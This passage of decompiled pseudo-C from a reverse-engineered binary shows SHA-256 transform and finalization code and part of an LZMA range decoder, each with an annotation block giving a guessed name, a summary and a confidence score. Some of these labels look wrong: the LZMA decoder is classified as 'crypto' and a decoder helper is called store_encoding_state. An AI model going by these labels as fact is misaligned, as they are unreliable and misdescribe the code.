               uVar18 + local_dc + ((uVar17 ^ uVar15) & uVar12 ^ uVar17) +
               (uVar5 >> 6 | uVar5 << 0x1a);
    uVar11 = uVar11 + local_a8;
    uVar5 = (uVar16 >> 9 | uVar16 * 0x800000) ^ uVar16;
    uVar5 = (uVar5 >> 0xb | uVar5 << 0x15) ^ uVar16;
    uVar18 = (uVar5 >> 2 | uVar5 << 0x1e) + ((uVar4 ^ uVar3) & uVar16) + (uVar4 & uVar3) + local_a8;
    uVar5 = (local_d4 >> 0xb | local_d4 << 0x15) ^ local_d4;
    uVar8 = (local_e0 >> 2 | local_e0 * 0x40000000) ^ local_e0;
    local_d8 = ((uVar5 >> 7 | uVar5 << 0x19) ^ local_d4 >> 3) + local_b4 + local_d8 +
               ((uVar8 << 0xf | uVar8 >> 0x11) ^ local_e0 >> 10);
    uVar5 = (uVar11 >> 0xe | uVar11 * 0x40000) ^ uVar11;
    uVar5 = (uVar5 >> 5 | uVar5 << 0x1b) ^ uVar11;
    local_a4 = uVar17 + local_d8 + ((uVar15 ^ uVar12) & uVar11 ^ uVar15) +
               (uVar5 >> 6 | uVar5 << 0x1a) + local_a4;
    uVar4 = uVar4 + local_a4;
    uVar5 = (uVar18 >> 9 | uVar18 * 0x800000) ^ uVar18;
    uVar5 = (uVar5 >> 0xb | uVar5 << 0x15) ^ uVar18;
    uVar5 = (uVar5 >> 2 | uVar5 << 0x1e) + ((uVar3 ^ uVar16) & uVar18) + (uVar3 & uVar16) + local_a4
    ;
    uVar8 = (local_d0 >> 0xb | local_d0 << 0x15) ^ local_d0;
    uVar17 = (local_dc >> 2 | local_dc * 0x40000000) ^ local_dc;
    local_d4 = ((uVar8 >> 7 | uVar8 << 0x19) ^ local_d0 >> 3) + uVar14 + local_d4 +
               ((uVar17 << 0xf | uVar17 >> 0x11) ^ local_dc >> 10);
    uVar8 = (uVar4 >> 0xe | uVar4 * 0x40000) ^ uVar4;
    uVar8 = (uVar8 >> 5 | uVar8 << 0x1b) ^ uVar4;
    local_a0 = uVar15 + local_d4 + ((uVar12 ^ uVar11) & uVar4 ^ uVar12) +
               (uVar8 >> 6 | uVar8 << 0x1a) + local_a0;
    uVar3 = uVar3 + local_a0;
    uVar15 = (uVar5 >> 9 | uVar5 * 0x800000) ^ uVar5;
    uVar15 = (uVar15 >> 0xb | uVar15 << 0x15) ^ uVar5;
    uVar15 = (uVar15 >> 2 | uVar15 << 0x1e) + ((uVar16 ^ uVar18) & uVar5) + (uVar16 & uVar18) +
             local_a0;
    uVar8 = (local_cc >> 0xb | local_cc << 0x15) ^ local_cc;
    uVar17 = (local_d8 >> 2 | local_d8 * 0x40000000) ^ local_d8;
    local_d0 = ((uVar8 >> 7 | uVar8 << 0x19) ^ local_cc >> 3) + uVar7 + local_d0 +
               ((uVar17 << 0xf | uVar17 >> 0x11) ^ local_d8 >> 10);
    uVar8 = (uVar3 >> 0xe | uVar3 * 0x40000) ^ uVar3;
    uVar8 = (uVar8 >> 5 | uVar8 << 0x1b) ^ uVar3;
    local_9c = uVar12 + local_d0 + ((uVar11 ^ uVar4) & uVar3 ^ uVar11) +
               (uVar8 >> 6 | uVar8 << 0x1a) + local_9c;
    uVar16 = uVar16 + local_9c;
    uVar12 = (uVar15 >> 9 | uVar15 * 0x800000) ^ uVar15;
    uVar12 = (uVar12 >> 0xb | uVar12 << 0x15) ^ uVar15;
    uVar10 = (uVar12 >> 2 | uVar12 << 0x1e) + ((uVar18 ^ uVar5) & uVar15) + (uVar18 & uVar5) +
             local_9c;
    uVar12 = (local_c8 >> 0xb | local_c8 << 0x15) ^ local_c8;
    uVar8 = (local_d4 >> 2 | local_d4 * 0x40000000) ^ local_d4;
    local_cc = ((uVar8 << 0xf | uVar8 >> 0x11) ^ local_d4 >> 10) +
               ((uVar12 >> 7 | uVar12 << 0x19) ^ local_c8 >> 3) + local_b0 + local_cc;
    uVar12 = (uVar16 >> 0xe | uVar16 * 0x40000) ^ uVar16;
    uVar12 = (uVar12 >> 5 | uVar12 << 0x1b) ^ uVar16;
    local_98 = uVar11 + local_cc + ((uVar4 ^ uVar3) & uVar16 ^ uVar4) +
               (uVar12 >> 6 | uVar12 << 0x1a) + local_98;
    uVar18 = uVar18 + local_98;
    uVar11 = (uVar10 >> 9 | uVar10 * 0x800000) ^ uVar10;
    uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar10;
    uVar6 = (uVar11 >> 2 | uVar11 << 0x1e) + ((uVar5 ^ uVar15) & uVar10) + (uVar5 & uVar15) +
            local_98;
    uVar11 = (local_c4 >> 0xb | local_c4 << 0x15) ^ local_c4;
    uVar12 = (local_d0 >> 2 | local_d0 * 0x40000000) ^ local_d0;
    local_c8 = ((uVar11 >> 7 | uVar11 << 0x19) ^ local_c4 >> 3) + local_f8 + local_c8 +
               ((uVar12 << 0xf | uVar12 >> 0x11) ^ local_d0 >> 10);
    uVar11 = (uVar18 >> 0xe | uVar18 * 0x40000) ^ uVar18;
    uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar18;
    local_94 = local_94 +
               uVar4 + local_c8 + ((uVar3 ^ uVar16) & uVar18 ^ uVar3) +
               (uVar11 >> 6 | uVar11 << 0x1a);
    uVar5 = uVar5 + local_94;
    uVar11 = (uVar6 >> 9 | uVar6 * 0x800000) ^ uVar6;
    uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar6;
    uVar8 = (uVar11 >> 2 | uVar11 << 0x1e) + ((uVar15 ^ uVar10) & uVar6) + (uVar15 & uVar10) +
            local_94;
    uVar11 = (local_c0 >> 0xb | local_c0 << 0x15) ^ local_c0;
    uVar12 = (local_cc >> 2 | local_cc * 0x40000000) ^ local_cc;
    local_c4 = ((uVar11 >> 7 | uVar11 << 0x19) ^ local_c0 >> 3) + local_e0 + local_c4 +
               ((uVar12 << 0xf | uVar12 >> 0x11) ^ local_cc >> 10);
    uVar11 = (uVar5 >> 0xe | uVar5 * 0x40000) ^ uVar5;
    uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar5;
    local_90 = uVar3 + local_c4 + ((uVar16 ^ uVar18) & uVar5 ^ uVar16) +
               (uVar11 >> 6 | uVar11 << 0x1a) + local_90;
    uVar15 = uVar15 + local_90;
    uVar3 = (uVar8 >> 9 | uVar8 * 0x800000) ^ uVar8;
    uVar3 = (uVar3 >> 0xb | uVar3 << 0x15) ^ uVar8;
    uVar3 = (uVar3 >> 2 | uVar3 << 0x1e) + ((uVar10 ^ uVar6) & uVar8) + (uVar10 & uVar6) + local_90;
    uVar11 = (local_bc >> 0xb | local_bc << 0x15) ^ local_bc;
    uVar12 = (local_c8 >> 2 | local_c8 * 0x40000000) ^ local_c8;
    local_c0 = ((uVar11 >> 7 | uVar11 << 0x19) ^ local_bc >> 3) + local_dc + local_c0 +
               ((uVar12 << 0xf | uVar12 >> 0x11) ^ local_c8 >> 10);
    uVar11 = (uVar15 >> 0xe | uVar15 * 0x40000) ^ uVar15;
    uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar15;
    local_8c = uVar16 + local_c0 + ((uVar18 ^ uVar5) & uVar15 ^ uVar18) +
               (uVar11 >> 6 | uVar11 << 0x1a) + local_8c;
    uVar10 = uVar10 + local_8c;
    uVar11 = (uVar3 >> 9 | uVar3 * 0x800000) ^ uVar3;
    uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar3;
    uVar16 = (uVar11 >> 2 | uVar11 << 0x1e) + ((uVar6 ^ uVar8) & uVar3) + (uVar6 & uVar8) + local_8c
    ;
    uVar12 = (local_b8 >> 0xb | local_b8 << 0x15) ^ local_b8;
    uVar11 = (local_c4 >> 2 | local_c4 * 0x40000000) ^ local_c4;
    local_bc = ((uVar12 >> 7 | uVar12 << 0x19) ^ local_b8 >> 3) + local_d8 + local_bc +
               ((uVar11 << 0xf | uVar11 >> 0x11) ^ local_c4 >> 10);
    uVar11 = (uVar10 >> 0xe | uVar10 * 0x40000) ^ uVar10;
    uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar10;
    local_88 = local_88 +
               uVar18 + local_bc + ((uVar5 ^ uVar15) & uVar10 ^ uVar5) +
               (uVar11 >> 6 | uVar11 << 0x1a);
    uVar6 = uVar6 + local_88;
    uVar11 = (uVar16 >> 9 | uVar16 * 0x800000) ^ uVar16;
    uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar16;
    uVar18 = (uVar11 >> 2 | uVar11 << 0x1e) + ((uVar8 ^ uVar3) & uVar16) + (uVar8 & uVar3) +
             local_88;
    uVar12 = (local_b4 >> 0xb | local_b4 << 0x15) ^ local_b4;
    uVar11 = (local_c0 >> 2 | local_c0 * 0x40000000) ^ local_c0;
    local_b8 = ((uVar12 >> 7 | uVar12 << 0x19) ^ local_b4 >> 3) + local_d4 + local_b8 +
               ((uVar11 << 0xf | uVar11 >> 0x11) ^ local_c0 >> 10);
    uVar11 = (uVar6 >> 0xe | uVar6 * 0x40000) ^ uVar6;
    uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar6;
    local_84 = uVar5 + local_b8 + ((uVar15 ^ uVar10) & uVar6 ^ uVar15) +
               (uVar11 >> 6 | uVar11 << 0x1a) + local_84;
    uVar8 = uVar8 + local_84;
    uVar11 = (uVar18 >> 9 | uVar18 * 0x800000) ^ uVar18;
    uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar18;
    uVar17 = (uVar11 >> 2 | uVar11 << 0x1e) + ((uVar3 ^ uVar16) & uVar18) + (uVar3 & uVar16) +
             local_84;
    uVar11 = (uVar14 >> 0xb | uVar14 << 0x15) ^ uVar14;
    uVar12 = (local_bc >> 2 | local_bc * 0x40000000) ^ local_bc;
    local_b4 = ((uVar12 << 0xf | uVar12 >> 0x11) ^ local_bc >> 10) +
               ((uVar11 >> 7 | uVar11 << 0x19) ^ uVar14 >> 3) + local_d0 + local_b4;
    uVar11 = (uVar8 >> 0xe | uVar8 * 0x40000) ^ uVar8;
    uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar8;
    local_80 = uVar15 + local_b4 + ((uVar10 ^ uVar6) & uVar8 ^ uVar10) +
               (uVar11 >> 6 | uVar11 << 0x1a) + local_80;
    uVar3 = uVar3 + local_80;
    uVar11 = (uVar17 >> 9 | uVar17 * 0x800000) ^ uVar17;
    uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar17;
    uVar15 = (uVar11 >> 2 | uVar11 << 0x1e) + ((uVar16 ^ uVar18) & uVar17) + (uVar16 & uVar18) +
             local_80;
    uVar11 = (uVar7 >> 0xb | uVar7 << 0x15) ^ uVar7;
    uVar12 = (local_b8 >> 2 | local_b8 * 0x40000000) ^ local_b8;
    uVar14 = ((uVar11 >> 7 | uVar11 << 0x19) ^ uVar7 >> 3) + local_cc + uVar14 +
             ((uVar12 << 0xf | uVar12 >> 0x11) ^ local_b8 >> 10);
    uVar11 = (uVar3 >> 0xe | uVar3 * 0x40000) ^ uVar3;
    uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar3;
    local_7c = uVar10 + uVar14 + ((uVar6 ^ uVar8) & uVar3 ^ uVar6) + (uVar11 >> 6 | uVar11 << 0x1a)
               + local_7c;
    uVar16 = uVar16 + local_7c;
    uVar11 = (uVar15 >> 9 | uVar15 * 0x800000) ^ uVar15;
    uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar15;
    uVar12 = (uVar11 >> 2 | uVar11 << 0x1e) + ((uVar18 ^ uVar17) & uVar15) + (uVar18 & uVar17) +
             local_7c;
    uVar11 = (local_b0 >> 0xb | local_b0 * 0x200000) ^ local_b0;
    uVar4 = (uVar12 >> 9 | uVar12 * 0x800000) ^ uVar12;
    uVar5 = (local_b4 >> 2 | local_b4 * 0x40000000) ^ local_b4;
    uVar7 = ((uVar5 << 0xf | uVar5 >> 0x11) ^ local_b4 >> 10) +
            ((uVar11 >> 7 | uVar11 << 0x19) ^ local_b0 >> 3) + local_c8 + uVar7;
    uVar11 = (uVar16 >> 0xe | uVar16 * 0x40000) ^ uVar16;
    uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar16;
    local_78 = (uVar11 >> 6 | uVar11 << 0x1a) + ((uVar8 ^ uVar3) & uVar16 ^ uVar8) + uVar6 + uVar7 +
               local_78;
    uVar18 = uVar18 + local_78;
    uVar11 = (uVar4 >> 0xb | uVar4 << 0x15) ^ uVar12;
    uVar11 = (uVar11 >> 2 | uVar11 << 0x1e) + ((uVar17 ^ uVar15) & uVar12) + (uVar17 & uVar15) +
             local_78;
    if (puVar13 + 0x40 == &DAT_00128bc0) break;
    local_74 = *(int *)(puVar13 + 0x84);
    iVar9 = *(int *)(puVar13 + 0x80);
    local_ac = *(int *)(puVar13 + 0x88);
    local_a8 = *(int *)(puVar13 + 0x8c);
    local_a4 = *(int *)(puVar13 + 0x90);
    local_a0 = *(int *)(puVar13 + 0x94);
    local_9c = *(int *)(puVar13 + 0x98);
    local_98 = *(int *)(puVar13 + 0x9c);
    local_94 = *(int *)(puVar13 + 0xa0);
    local_90 = *(int *)(puVar13 + 0xa4);
    local_8c = *(int *)(puVar13 + 0xa8);
    local_88 = *(int *)(puVar13 + 0xac);
    local_84 = *(int *)(puVar13 + 0xb0);
    local_80 = *(int *)(puVar13 + 0xb4);
    local_7c = *(int *)(puVar13 + 0xb8);
    local_78 = *(int *)(puVar13 + 0xbc);
    puVar13 = puVar13 + 0x40;
  }
  *param_1 = *param_1 + uVar11;
  param_1[1] = param_1[1] + uVar12;
  param_1[2] = param_1[2] + uVar15;
  param_1[3] = param_1[3] + uVar17;
  param_1[4] = param_1[4] + uVar18;
  param_1[5] = param_1[5] + uVar16;
  param_1[6] = param_1[6] + uVar3;
  param_1[7] = param_1[7] + uVar8;
  if (lVar2 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  sha256_finalize
 * @brief SHA-256 finalization: applies padding, appends bit length, processes final block, byte-swaps output hash.
 * @confidence 92%
 * @classification crypto
 * @address 0x001164f0
 */

/* Finalizes a SHA-256 hash computation by padding the message, appending the bit length, processing
   final blocks, and byte-swapping the hash output. */

void sha256_finalize(uint *param_1)

{
  uint uVar1;
  long lVar2;
  ulong uVar3;
  uint *puVar4;
  uint *puVar5;
  bool bVar6;
  
  lVar2 = *(long *)(param_1 + 0x18);
  uVar3 = (ulong)((uint)lVar2 & 0x3f);
  *(undefined1 *)((long)param_1 + uVar3) = 0x80;
  if (uVar3 != 0x37) {
    lVar2 = uVar3 + 1;
    do {
      while (lVar2 == 0x40) {
        sha256_transform(param_1 + 0x10,param_1);
        *(undefined1 *)((long)param_1 + 2) = 0;
        *(undefined2 *)param_1 = 0;
        lVar2 = 3;
      }
      *(undefined1 *)((long)param_1 + lVar2) = 0;
      bVar6 = lVar2 != 0x37;
      lVar2 = lVar2 + 1;
    } while (bVar6);
    lVar2 = *(long *)(param_1 + 0x18);
  }
  uVar3 = lVar2 << 3;
  *(ulong *)(param_1 + 0x18) = uVar3;
  *(ulong *)(param_1 + 0xe) =
       uVar3 >> 0x38 | (uVar3 & 0xff000000000000) >> 0x28 | (uVar3 & 0xff0000000000) >> 0x18 |
       (uVar3 & 0xff00000000) >> 8 | (uVar3 & 0xff000000) << 8 | (uVar3 & 0xff0000) << 0x18 |
       (uVar3 & 0xff00) << 0x28 | lVar2 << 0x3b;
  sha256_transform(param_1 + 0x10,param_1);
  puVar4 = param_1;
  do {
    uVar1 = puVar4[0x10];
    puVar5 = puVar4 + 1;
    *puVar4 = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;
    puVar4 = puVar5;
  } while (puVar5 != param_1 + 8);
  return;
}



/**
 * @name  lzma_lzma_decode
 * @brief Core LZMA range-coded decoder implementing the full LZMA decode loop. Uses adaptive probability models with 11-bit precision (0x800 initial). Supports streaming via a 23-state resumption machine (coder+0x6ea4). Contains a slow path with boundary checks and an optimized fast inner loop with unrolled 8-iteration literal decoding. Decodes literals, matches, short reps (rep0), and long reps (rep0-rep3) with distance slot decoding via bit-tree coded probabilities and reverse bit-tree alignment bits. The 0x408010 constant is a bit-table for checking which decoder states represent valid end-of-stream positions.
 * @confidence 95%
 * @classification crypto
 * @address 0x0011d0b0
 */

/* Core LZMA decoder function implementing the LZMA compression algorithm's decode loop. Uses range
   coding with adaptive probability models. Supports streaming via a state machine (state at
   coder+0x6ea4) that allows interruption and resumption. Contains both a slow path with boundary
   checks and a fast inner loop. Decodes literals, matches, short reps, and long reps with distance
   slot and length decoding using binary tree-coded probabilities. */

ulong lzma_lzma_decode(long param_1,long *param_2,long param_3,long *param_4,long param_5)

{
  byte *pbVar1;
  long lVar2;
  char cVar3;
  byte bVar4;
  ushort uVar5;
  ushort uVar6;
  uint uVar7;
  ushort *puVar8;
  long lVar9;
  int iVar10;
  short sVar11;
  bool bVar12;
  int iVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  ulong uVar18;
  byte *pbVar19;
  undefined1 *puVar20;
  undefined1 *puVar21;
  ushort *puVar22;
  long lVar23;
  long lVar24;
  int iVar25;
  size_t sVar26;
  uint uVar27;
  uint uVar28;
  uint uVar29;
  uint uVar30;
  uint uVar31;
  uint uVar32;
  uint uVar33;
  ulong uVar34;
  ushort *puVar35;
  long lVar36;
  ushort *puVar37;
  uint uVar38;
  uint uVar39;
  uint uVar40;
  byte *pbVar41;
  char cVar42;
  ulong uVar43;
  ushort *puVar44;
  bool bVar45;
  ushort *puVar46;
  ulong uVar47;
  long lVar48;
  ulong uVar49;
  uint local_ac;
  uint local_a4;
  uint local_78;
  ushort *local_70;
  byte local_68;
  char local_61;
  
  iVar13 = *(int *)(param_1 + 0x6e74);
  lVar23 = *param_4;
  while (iVar13 != 0) {
    while( true ) {
      if (param_5 == lVar23) {
        return 0;
      }
      pbVar41 = (byte *)(param_3 + lVar23);
      if (iVar13 != 5) break;
      if (*pbVar41 != 0) {
        return 9;
      }
      lVar23 = lVar23 + 1;
      *(int *)(param_1 + 0x6e70) = *(int *)(param_1 + 0x6e70) << 8;
      iVar13 = 4;
      *param_4 = lVar23;
      *(undefined4 *)(param_1 + 0x6e74) = 4;
    }
    lVar23 = lVar23 + 1;
    iVar13 = iVar13 - 1;
    *(uint *)(param_1 + 0x6e70) = *(int *)(param_1 + 0x6e70) << 8 | (uint)*pbVar41;
    *param_4 = lVar23;
    *(int *)(param_1 + 0x6e74) = iVar13;
  }
  pbVar41 = (byte *)(param_3 + lVar23);
  uVar28 = *(uint *)(param_1 + 0x6e6c);
  uVar39 = *(uint *)(param_1 + 0x6e70);
  uVar14 = *(uint *)(param_1 + 0x6eb0);
  uVar18 = (ulong)uVar14;
  puVar22 = (ushort *)param_2[2];
  lVar48 = *param_2;
  puVar46 = (ushort *)param_2[3];
  puVar8 = (ushort *)param_2[1];
  lVar9 = param_2[4];
  cVar3 = (char)param_2[5];
  local_a4 = *(uint *)(param_1 + 0x6eb4);
  pbVar1 = (byte *)(param_3 + param_5);
  lVar36 = *(long *)(param_1 + 0x6ea8);
  pbVar19 = pbVar1 - 0x14;
  if (param_5 - lVar23 < 0x15) {
    pbVar19 = pbVar41;
  }
  uVar27 = *(uint *)(param_1 + 0x6e78);
  uVar49 = (ulong)uVar27;
  uVar15 = *(uint *)(param_1 + 0x6e7c);
  local_ac = *(uint *)(param_1 + 0x6e80);
  uVar33 = *(uint *)(param_1 + 0x6e84);
  local_78 = *(uint *)(param_1 + 0x6e88);
  uVar17 = *(uint *)(param_1 + 0x6e8c);
  uVar29 = *(uint *)(param_1 + 0x6ebc);
  uVar43 = (ulong)(uVar17 & (uint)puVar8);
  bVar12 = false;
  uVar38 = *(uint *)(param_1 + 0x6eb8);
  uVar47 = (ulong)uVar29;
  uVar7 = *(uint *)(param_1 + 0x6e94);
  uVar34 = *(ulong *)(param_1 + 0x6e98);
  local_61 = uVar34 == 0xffffffffffffffff;
  if ((!(bool)local_61) && (uVar34 <= (ulong)((long)puVar46 - (long)puVar8))) {
    puVar46 = (ushort *)(uVar34 + (long)puVar8);
    bVar12 = true;
  }
  local_68 = (byte)*(undefined4 *)(param_1 + 0x6e90);
  puVar44 = puVar8;
  local_70 = puVar8;
  uVar16 = uVar15;
  switch(*(undefined4 *)(param_1 + 0x6ea4)) {
  case 0:
  case 1:
    break;
  case 2:
    goto LAB_0011d39c;
  case 3:
    puVar35 = puVar8;
    goto LAB_0011de4d;
  case 4:
    puVar44 = puVar22;
    goto LAB_0011ddba;
  case 5:
    uVar14 = uVar33;
    goto LAB_0011dd21;
  case 6:
    uVar15 = local_ac;
    goto LAB_0011dc17;
  case 7:
    goto LAB_0011deb0;
  case 8:
    goto LAB_0011dcc9;
  case 9:
    goto LAB_0011e29a;
  case 10:
    goto LAB_0011e20c;
  case 0xb:
    goto LAB_0011e0d8;
  case 0xc:
    goto LAB_0011e12c;
  case 0xd:
LAB_0011e2f2:
    if (uVar28 < 0x1000000) {
      if (pbVar1 == pbVar41) {
        *(undefined4 *)(param_1 + 0x6ea4) = 0xd;
        uVar18 = store_encoding_state();
        return uVar18;
      }
      bVar4 = *pbVar41;
      uVar28 = uVar28 << 8;
      pbVar41 = pbVar41 + 1;
      uVar39 = uVar39 << 8 | (uint)bVar4;
    }
    uVar17 = (-(uint)(uVar39 == 0) & 0xfffffff8) + 9;
    uVar18 = (ulong)uVar17;
    *(long *)(param_1 + 0x6ea8) = lVar36;
    *(uint *)(param_1 + 0x6eb0) = uVar14;
    param_2[1] = (long)local_70;
    param_2[2] = (long)puVar22;
    *(uint *)(param_1 + 0x6e6c) = uVar28;
    *(uint *)(param_1 + 0x6e78) = uVar27;
    *(uint *)(param_1 + 0x6e70) = uVar39;
    *(uint *)(param_1 + 0x6e7c) = uVar15;
    *(undefined4 *)(param_1 + 0x6e74) = 0;
    *(uint *)(param_1 + 0x6e80) = local_ac;
    *param_4 = (long)pbVar41 - param_3;
    *(uint *)(param_1 + 0x6e84) = uVar33;
    *(uint *)(param_1 + 0x6eb8) = uVar38;
    *(uint *)(param_1 + 0x6e88) = local_78;
    *(uint *)(param_1 + 0x6eb4) = local_a4;
    *(uint *)(param_1 + 0x6ebc) = uVar29;
    if (((uVar34 == 0xffffffffffffffff) ||
        (lVar23 = (long)puVar8 + (uVar34 - (long)local_70), *(long *)(param_1 + 0x6e98) = lVar23,
        lVar23 != 0)) || (uVar17 != 0)) {
      if (uVar17 == 1) {
        *(undefined4 *)(param_1 + 0x6e6c) = 0xffffffff;
        *(undefined8 *)(param_1 + 0x6e70) = 0x500000000;
        *(undefined4 *)(param_1 + 0x6ea4) = 1;
      }
    }
    else if (*(uint *)(param_1 + 0x6ea4) < 0x17) {
      uVar18 = (ulong)(-(uint)((~(byte)(0x408010L >> ((byte)*(uint *)(param_1 + 0x6ea4) & 0x3f)) & 1
                               ) == 0) & 9);
    }
    return uVar18;
  case 0xe:
    goto LAB_0011e418;
  case 0xf:
    puVar35 = puVar22;
    goto LAB_0011e4f7;
  case 0x10:
    goto LAB_0011e47a;
  case 0x11:
    goto LAB_0011e5fe;
  case 0x12:
    uVar14 = uVar33;
    goto LAB_0011df31;
  case 0x13:
    goto LAB_0011dfb9;
  case 0x14:
    goto LAB_0011e569;
  case 0x15:
    goto LAB_0011e069;
  case 0x16:
    puVar44 = (ushort *)(ulong)uVar15;
    goto LAB_0011d440;
  default:
    uVar18 = store_encoding_state();
    return uVar18;
  }
  do {
    if ((bVar12) && (local_70 == puVar46)) {
      if (uVar28 < 0x1000000) {
        if (pbVar1 == pbVar41) {
          *(undefined4 *)(param_1 + 0x6ea4) = 0;
          uVar18 = store_encoding_state();
          return uVar18;
        }
        bVar4 = *pbVar41;
        uVar28 = uVar28 << 8;
        pbVar41 = pbVar41 + 1;
        uVar39 = uVar39 << 8 | (uint)bVar4;
      }
      if (uVar39 == 0) {
        uVar18 = store_encoding_state();
        return uVar18;
      }
      local_61 = *(char *)(param_1 + 0x6ea0);
      if (local_61 == '\0') goto LAB_0011fbba;
    }
    if (uVar28 < 0x1000000) {
      if (pbVar1 == pbVar41) {
        *(undefined4 *)(param_1 + 0x6ea4) = 1;
        uVar18 = store_encoding_state();
        return uVar18;
      }
      bVar4 = *pbVar41;
      uVar28 = uVar28 << 8;
      pbVar41 = pbVar41 + 1;
      uVar39 = uVar39 << 8 | (uint)bVar4;
    }
    uVar27 = (uint)uVar49;
    lVar23 = param_1 + ((uVar49 & 0xffffffff) * 0x10 + uVar43) * 2;
    uVar5 = *(ushort *)(lVar23 + 0x6000);
    uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
    if (uVar39 < uVar14) {
      uVar43 = (long)local_70 - 1;
      *(ushort *)(lVar23 + 0x6000) = (short)(0x800 - uVar5 >> 5) + uVar5;
      lVar36 = param_1 + ((ulong)((uint)*(byte *)(lVar48 - 1 + (long)local_70) +
                                  (int)((long)local_70 << 8) & uVar7) << (local_68 & 0x3f)) * 6;
      uVar28 = uVar14;
      if (uVar27 < 7) {
        uVar14 = 3;
        if (2 < uVar27) {
          uVar14 = uVar27;
        }
        uVar18 = 1;
        uVar49 = (ulong)(uVar14 - 3);
LAB_0011d39c:
        puVar35 = (ushort *)0x800;
        do {
          if (uVar28 < 0x1000000) {
            if (pbVar1 == pbVar41) {
              *(undefined4 *)(param_1 + 0x6ea4) = 2;
LAB_00120061:
              uVar18 = store_encoding_state
                                 (puVar35,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                  (long)pbVar1 - param_3,lVar36,param_4,puVar22,puVar46,uVar47);
              return uVar18;
            }
            bVar4 = *pbVar41;
            uVar28 = uVar28 << 8;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 << 8 | (uint)bVar4;
          }
          uVar14 = (int)uVar18 * 2;
          puVar44 = (ushort *)(lVar36 + uVar18 * 2);
          uVar5 = *puVar44;
          uVar27 = (uVar28 >> 0xb) * (uint)uVar5;
          uVar43 = (ulong)uVar27;
          if (uVar39 < uVar27) {
            sVar11 = (short)(0x800 - uVar5 >> 5);
            uVar28 = uVar27;
          }
          else {
            uVar39 = uVar39 - uVar27;
            uVar14 = uVar14 + 1;
            uVar43 = (ulong)(uVar5 >> 5);
            sVar11 = -(uVar5 >> 5);
            uVar28 = uVar28 - uVar27;
          }
          uVar18 = (ulong)uVar14;
          *puVar44 = uVar5 + sVar11;
          puVar44 = puVar22;
        } while (uVar14 < 0x100);
      }
      else {
        uVar38 = 0x100;
        uVar18 = 1;
        uVar14 = uVar27 - 3;
        if (9 < uVar27) {
          uVar14 = uVar27 - 6;
        }
        uVar49 = (ulong)uVar14;
        lVar23 = lVar9 - 0x120;
        if ((ushort *)(ulong)uVar15 < local_70) {
          lVar23 = 0;
        }
        bVar4 = *(byte *)(lVar23 + lVar48 + (uVar43 - (long)(ulong)uVar15));
        uVar29 = (uint)bVar4 + (uint)bVar4;
        puVar35 = (ushort *)0x0;
LAB_0011de4d:
        do {
          uVar14 = uVar38 & uVar29;
          uVar43 = (ulong)uVar14;
          if (uVar28 < 0x1000000) {
            if (pbVar1 == pbVar41) {
              uVar47 = (ulong)uVar29;
              *(undefined4 *)(param_1 + 0x6ea4) = 3;
              goto LAB_00120061;
            }
            bVar4 = *pbVar41;
            uVar28 = uVar28 << 8;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 << 8 | (uint)bVar4;
          }
          puVar35 = (ushort *)(lVar36 + (ulong)(uVar38 + (int)uVar18 + uVar14) * 2);
          uVar27 = (int)uVar18 * 2;
          uVar5 = *puVar35;
          uVar16 = (uVar28 >> 0xb) * (uint)uVar5;
          if (uVar39 < uVar16) {
            uVar43 = (ulong)~uVar14;
            uVar38 = uVar38 & ~uVar14;
            sVar11 = (short)(0x800 - uVar5 >> 5);
            uVar28 = uVar16;
          }
          else {
            uVar39 = uVar39 - uVar16;
            uVar27 = uVar27 + 1;
            sVar11 = -(uVar5 >> 5);
            uVar28 = uVar28 - uVar16;
            uVar38 = uVar14;
          }
          uVar18 = (ulong)uVar27;
          *puVar35 = uVar5 + sVar11;
          uVar29 = uVar29 * 2;
        } while (uVar27 < 0x100);
        uVar47 = (ulong)uVar29;
        puVar44 = puVar22;
      }
LAB_0011ddba:
      if (local_70 == puVar46) {
        *(undefined4 *)(param_1 + 0x6ea4) = 4;
        uVar18 = store_encoding_state
                           (puVar46,*(undefined8 *)(param_1 + 0x6e98),uVar43,(long)pbVar41 - param_3
                           );
        return uVar18;
      }
      puVar37 = (ushort *)((long)local_70 + 1);
      *(char *)(lVar48 + (long)local_70) = (char)uVar18;
      puVar22 = (ushort *)((long)local_70 - 0x23f);
      if (cVar3 != '\0') {
        puVar22 = puVar44;
      }
    }
    else {
      uVar28 = uVar28 - uVar14;
      uVar39 = uVar39 - uVar14;
      uVar14 = (uint)uVar5 - (uint)(uVar5 >> 5);
      *(short *)(lVar23 + 0x6000) = (short)uVar14;
      puVar44 = (ushort *)(ulong)uVar14;
      uVar14 = uVar33;
LAB_0011dd21:
      if (uVar28 < 0x1000000) {
        if (pbVar1 == pbVar41) {
          *(undefined4 *)(param_1 + 0x6ea4) = 5;
          uVar18 = store_encoding_state
                             (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                              (long)pbVar1 - param_3);
          return uVar18;
        }
        bVar4 = *pbVar41;
        uVar28 = uVar28 << 8;
        pbVar41 = pbVar41 + 1;
        uVar39 = uVar39 << 8 | (uint)bVar4;
      }
      lVar23 = param_1 + (uVar49 & 0xffffffff) * 2;
